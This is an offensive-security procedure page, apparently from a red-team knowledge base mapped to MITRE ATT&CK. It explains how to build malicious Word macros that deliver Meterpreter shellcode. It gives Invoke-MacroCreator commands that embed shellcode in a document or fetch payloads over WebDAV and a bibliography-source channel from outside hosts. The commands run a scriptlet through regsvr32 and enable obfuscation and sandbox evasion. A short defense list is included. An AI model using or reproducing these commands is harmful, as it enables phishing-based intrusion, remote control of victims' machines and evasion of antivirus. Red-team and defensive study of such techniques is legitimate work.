---
id: 9dc4f18c-db17-4ee2-a15a-d54788fdf69b
name: Macro Delivery of Meterpreter Shellcode
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:23.422879+00:00'
updated_at: '2023-04-10T20:36:48.515400+00:00'
tactics:
- '[[Defense Evasion|TA0005 - Defense Evasion]]'
- '[[Execution|TA0002 - Execution]]'
techniques:
- '[[Command-Line Interface|T1059 - Command-Line Interface]]'
- '[[Scripting|T1064 - Scripting]]'
sub_techniques:
- '[[Visual Basic|T1059.005 - Visual Basic]]'
tags:
- '[[DOCM - Macro Creator]]'
- '[[Office - Attacks]]'
commands:
- '[[Create MS-Word document with embedded shellcode]]'
- '[[Deliver scriptlet over bibliography source covert channel]]'
- '[[Deliver shellcode over WebDAV covert channel]]'
---

# Macro Delivery of Meterpreter Shellcode

## Summary

This procedure involves creating a macro that delivers and executes Meterpreter shellcode. The macro is typically delivered via a malicious document, such as a Word or Excel file, and is designed to bypass typical security measures. Once the macro is executed, it delivers the Meterpreter shellcode,

## Description

# Description

This procedure involves creating a macro that delivers and executes Meterpreter shellcode. The macro is typically delivered via a malicious document, such as a Word or Excel file, and is designed to bypass typical security measures. Once the macro is executed, it delivers the Meterpreter shellcode, which allows the attacker to gain remote access to the target system. This type of attack is commonly used in targeted attacks against businesses and organizations. Technical details include encoding the shellcode and embedding it in the macro, and using various techniques to bypass security measures such as antivirus and firewalls. The business value of this attack is that it allows attackers to gain access to sensitive information and systems, which can be used for financial gain or other malicious purposes.

 

## Requirements

1. Access to a system with the ability to create macros

1. A malicious document to deliver the macro

1. Knowledge of encoding and embedding shellcode in the macro

 

## Defense

1. Use antivirus and firewalls to detect and block malicious documents and macros

1. Educate employees on the dangers of opening suspicious documents and enabling macros

1. Implement security measures such as network segmentation and access controls to limit the impact of a successful attack

 

## Objectives

1. Deliver and execute Meterpreter shellcode on the target system

1. Bypass security measures such as antivirus and firewalls

1. Gain remote access to the target system

 

# Instructions

1. To create a macro for meterpreter shellcode delivery, use the Invoke-MacroCreator command with the following arguments:

 



**Code**: [[# Shellcode embedded in the body of the MS-Word do]]



> 1. -i: Specifies the input file containing meterpreter shellcode.
2. -t: Specifies the type of payload. In this case, it is shellcode.
3. -url: Specifies the URL of the WebDAV server for delivering the shellcode over the covert channel.
4. -d: Specifies the delivery method. In this case, it is either body (to embed shellcode in the body of an MS-Word document) or webdav (to deliver shellcode over WebDAV covert channel).
5. -c: Specifies the command to execute the scriptlet. In this case, it is 'regsvr32 /u /n /s /i:regsvr32.sct scrobj.dll'.
6. -o: Enables obfuscation of the macro code.
7. -e: Enables sandbox evasion techniques.



**Command** ([[Create MS-Word document with embedded shellcode]]):

```bash
Invoke-MacroCreator -i meterpreter_shellcode.raw -t shellcode -d body
```





**Command** ([[Deliver shellcode over WebDAV covert channel]]):

```bash
Invoke-MacroCreator -i meterpreter_shellcode.raw -t shellcode -url webdavserver.com -d webdav -o
```





**Command** ([[Deliver scriptlet over bibliography source covert channel]]):

```bash
Invoke-MacroCreator -i regsvr32.sct -t file -url 'http://my.server.com/sources.xml' -d biblio -c 'regsvr32 /u /n /s /i:regsvr32.sct scrobj.dll' -o -e
```



## MITRE ATT&CK Mapping

### Tactics

- [[Defense Evasion|TA0005 - Defense Evasion]]
- [[Execution|TA0002 - Execution]]

### Techniques

- [[Command-Line Interface|T1059 - Command-Line Interface]]
- [[Scripting|T1064 - Scripting]]

### Sub-Techniques

- [[Visual Basic|T1059.005 - Visual Basic]]

## Commands Used

- [[Create MS-Word document with embedded shellcode]]
- [[Deliver scriptlet over bibliography source covert channel]]
- [[Deliver shellcode over WebDAV covert channel]]

## Tags

- [[DOCM - Macro Creator]]
- [[Office - Attacks]]


